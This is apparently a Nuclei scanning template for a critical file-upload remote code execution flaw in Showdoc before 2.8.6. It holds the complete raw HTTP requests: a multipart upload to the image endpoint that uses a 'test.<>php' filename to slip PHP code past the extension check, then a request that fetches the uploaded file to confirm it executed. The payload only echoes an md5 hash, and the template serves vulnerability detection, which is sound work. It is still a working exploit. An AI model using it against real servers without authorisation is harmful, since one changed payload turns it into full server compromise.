id: showdoc-file-upload-rce
info:
  author: pikpikcu
  name: Showdoc < 2.8.6 File Upload RCE
  reference: https://github.com/star7th/showdoc/pull/1059
  severity: critical
  tags: rce,fileupload,showdoc
requests:
- extractors:
  - group: 1
    internal: true
    name: path
    part: body
    regex:
    - /Uploads\\(.*?)"\,"success"
    type: regex
  matchers:
  - type: word
    words:
    - 3c7cb9f46815a790686b857fdbc4295a
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /index.php?s=/home/page/uploadImg HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101
    Firefox/81.0

    Content-Length: 239

    Content-Type: multipart/form-data; boundary=--------------------------835846770881083140190633

    Accept-Encoding: gzip


    ----------------------------835846770881083140190633

    Content-Disposition: form-data; name="editormd-image-file"; filename="test.<>php"

    Content-Type: text/plain


    <?php echo md5(''rce_test'');?>

    ----------------------------835846770881083140190633--

    '
  - "GET /Public/Uploads{{url_decode(\"\xA7path\xA7\")}} HTTP/1.1\nHost: {{Hostname}}\n\
    Origin: {{BaseURL}}\n"
